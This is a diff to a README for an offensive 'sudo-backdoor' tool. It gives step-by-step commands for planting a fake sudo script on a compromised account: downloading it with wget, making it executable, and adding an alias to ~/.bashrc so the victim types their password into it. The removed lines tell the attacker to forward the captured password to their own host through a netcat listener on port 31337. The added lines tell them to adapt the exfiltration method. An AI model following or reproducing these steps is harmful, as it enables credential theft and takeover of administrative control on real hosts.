@@ -12,23 +12,19 @@ Once you gain access to a user account that you suspect being sudoer, you can
 place this backdoored sudo script to gain administrative control over the host.
 
 ```
-cd /tmp
-git clone https://github.com/nisay759/sudo-backdoor.git
-cd sudo-backdoor
-cp sudo.sh /somewhere/in/the/filesystem/sudo
+wget https://raw.githubusercontent.com/nisay759/sudo-backdoor/master/sudo.sh -O /somewhere/sudo
+chmod +x /somewhere/sudo
 ```
 
-Now you should modify the script (the line before the last one) to forward the
-password to your host, instead of localhost. You should fire up a netcat
-listener on port 31337 and wait.
+Modify the script (the line before the last one) to adapt the extraction method
+with a one that fits your use-case.
 
 Next, you want the user to call the backdoored sudo instead of the original one:
 
 ```
-echo 'alias sudo="/somewhere/in/the/filesystem/sudo"' >> ~/.bashrc
+echo 'alias sudo="/somewhere/sudo"' >> ~/.bashrc
 ```
 for example.
 
 ## TODO
-- [ ] Add support for other languages
-- [ ] Encrypt the password before sending it
+- [ ] Add support for other locales
